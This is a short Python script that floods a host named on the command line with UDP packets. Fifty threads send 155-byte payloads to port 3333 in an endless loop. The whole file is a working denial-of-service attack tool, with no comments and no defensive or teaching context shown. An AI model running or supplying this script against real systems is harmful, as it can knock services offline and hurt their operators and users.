import socket
import sys
from concurrent.futures import ThreadPoolExecutor

pool = ThreadPoolExecutor(50)

random = b'A' * 155

def send(host, content):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(content, (host, 3333))


while True:
    pool.submit(send, sys.argv[1], random)
